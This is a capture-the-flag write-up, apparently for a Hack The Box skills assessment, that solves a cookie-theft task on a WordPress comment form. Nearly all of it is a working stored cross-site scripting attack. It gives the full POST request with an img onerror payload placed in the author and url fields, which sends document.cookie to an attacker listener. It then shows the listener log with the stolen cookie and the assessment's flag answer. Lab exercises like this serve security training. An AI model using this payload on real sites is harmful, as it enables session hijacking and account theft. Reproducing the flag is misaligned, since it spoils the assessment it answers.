# Skills Assessment
## Questions
1. What is the value of the 'flag' cookie? **Answer: HTB{cr055_5173_5cr1p71n6_n1nj4}**
   - Start a listener: `python -m http.server`
   - Spray the payload on non-checked fields:
        ```
        POST /assessment/wp-comments-post.php HTTP/1.1
        Host: 10.129.234.166
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Referer: http://10.129.234.166/assessment/index.php/2021/06/11/welcome-to-security-blog/
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 307
        Origin: http://10.129.234.166
        DNT: 1
        Connection: keep-alive
        Cookie: comment_author_64f8c552537770b7cb3d7d8a6530d74b=admin; comment_author_email_64f8c552537770b7cb3d7d8a6530d74b=admin%40htb.com; comment_author_url_64f8c552537770b7cb3d7d8a6530d74b=http%3A%2F%2Fadmin.coim
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i

        comment=aaaa&author='><img/src/onerror='document.location=`http://10.10.14.76:8000/?x=${document.cookie}`'>&email=admin%40htb.com&url='><img/src/onerror='document.location=`http://10.10.14.76:8000/?x=${document.cookie}`'>&wp-comment-cookies-consent=yes&submit=Post+Comment&comment_post_ID=8&comment_parent=0
        ```
   - Read the log on the listener for the flag:
        ```
        $ python -m http.server
        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
        10.129.234.166 - - [27/May/2026 03:34:37] "GET /?x=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1779867264;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4} HTTP/1.1" 200 -
        ```